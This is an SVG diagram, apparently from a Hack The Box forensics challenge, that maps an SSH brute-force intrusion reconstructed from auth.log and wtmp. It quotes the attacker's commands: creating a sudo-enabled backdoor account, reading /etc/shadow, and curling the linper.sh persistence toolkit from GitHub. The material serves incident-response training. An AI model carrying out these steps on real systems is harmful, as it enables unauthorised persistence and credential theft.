<svg xmlns="http://www.w3.org/2000/svg" width="1400" height="820" viewBox="0 0 1400 820" role="img" aria-labelledby="title desc">
  <title id="title">Brutus attack flow</title>
  <desc id="desc">SSH brute force to persistence chain reconstructed from auth.log and wtmp.</desc>
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0b1320"/>
      <stop offset="100%" stop-color="#0f1e31"/>
    </linearGradient>
    <style>
      .h1 { font: 700 40px 'Segoe UI', Arial, sans-serif; fill: #eef6ff; }
      .h2 { font: 400 20px 'Segoe UI', Arial, sans-serif; fill: #b5c9dd; }
      .bt { font: 700 22px 'Segoe UI', Arial, sans-serif; fill: #f5fbff; }
      .tx { font: 500 17px 'Segoe UI', Arial, sans-serif; fill: #d2e5f8; }
      .sm { font: 600 15px 'Segoe UI', Arial, sans-serif; fill: #9de2ff; }
    </style>
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M0,0 L10,5 L0,10 Z" fill="#7fd8ff"/>
    </marker>
  </defs>

  <rect width="1400" height="820" fill="url(#bg)" rx="20"/>
  <text x="60" y="90" class="h1">HTB Sherlock: Brutus Attack Flow</text>
  <text x="60" y="125" class="h2">Auth and session evidence from brute force to post exploitation</text>

  <rect x="70" y="210" width="250" height="150" rx="12" fill="#17364f" stroke="#2e5f84"/>
  <text x="95" y="250" class="bt">1) Brute force</text>
  <text x="95" y="282" class="tx">Rapid SSH failures</text>
  <text x="95" y="312" class="tx">Source: 65.2.161.68</text>
  <text x="95" y="340" class="sm">auth.log: Failed password</text>

  <rect x="390" y="210" width="250" height="150" rx="12" fill="#224233" stroke="#3d7a5d"/>
  <text x="415" y="250" class="bt">2) Access</text>
  <text x="415" y="282" class="tx">Accepted password root</text>
  <text x="415" y="312" class="tx">First hit disconnects fast</text>
  <text x="415" y="340" class="sm">tool validation behavior</text>

  <rect x="710" y="210" width="250" height="150" rx="12" fill="#3d2f45" stroke="#6e5c81"/>
  <text x="735" y="250" class="bt">3) Manual session</text>
  <text x="735" y="282" class="tx">Interactive login persists</text>
  <text x="735" y="312" class="tx">wtmp start: 06:32:45 UTC</text>
  <text x="735" y="340" class="sm">session id: 37</text>

  <rect x="1030" y="210" width="300" height="150" rx="12" fill="#4a2f33" stroke="#8c6269"/>
  <text x="1055" y="250" class="bt">4) Persistence setup</text>
  <text x="1055" y="282" class="tx">useradd cyberjunkie</text>
  <text x="1055" y="312" class="tx">usermod -aG sudo cyberjunkie</text>
  <text x="1055" y="340" class="sm">T1136.001 Local Account</text>

  <rect x="330" y="500" width="330" height="160" rx="12" fill="#1c3d45" stroke="#3c7986"/>
  <text x="360" y="540" class="bt">5) Credential access</text>
  <text x="360" y="572" class="tx">sudo cat /etc/shadow</text>
  <text x="360" y="602" class="tx">executed by cyberjunkie</text>

  <rect x="760" y="500" width="420" height="160" rx="12" fill="#2b3a4e" stroke="#4f7194"/>
  <text x="790" y="540" class="bt">6) Tool transfer</text>
  <text x="790" y="572" class="tx">sudo curl raw.githubusercontent.com</text>
  <text x="790" y="602" class="tx">downloaded linper.sh toolkit</text>

  <line x1="320" y1="285" x2="390" y2="285" stroke="#7fd8ff" stroke-width="4" marker-end="url(#arrow)"/>
  <line x1="640" y1="285" x2="710" y2="285" stroke="#7fd8ff" stroke-width="4" marker-end="url(#arrow)"/>
  <line x1="960" y1="285" x2="1030" y2="285" stroke="#7fd8ff" stroke-width="4" marker-end="url(#arrow)"/>
  <line x1="1120" y1="360" x2="920" y2="500" stroke="#7fd8ff" stroke-width="4" marker-end="url(#arrow)"/>
  <line x1="820" y1="360" x2="500" y2="500" stroke="#7fd8ff" stroke-width="4" marker-end="url(#arrow)"/>
</svg>